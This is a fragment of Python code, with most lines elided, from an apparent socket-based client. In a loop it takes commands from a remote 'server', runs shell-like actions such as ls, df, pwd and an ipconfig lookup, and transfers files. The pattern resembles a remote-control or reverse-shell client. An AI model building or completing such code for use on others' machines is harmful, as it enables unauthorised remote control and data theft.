...
while soc:
    ...
    if command.startswith("ls") or command=='df' or command=="pwd" or command== "ip" or re.match(regex, command) or command.endswith(".py") or command.endswith(".txt") :
        if command=="ip":
            command="ipconfig getifaddr en0".split()
        elif command.startswith("http") or command.startswith("https") or command.startswith("www"):
    ...
    # if server want to exit the connection 
        ...
        exit()
    # file transfer 
    elif command.endswith('.jpg') or command.endswith('.png'):
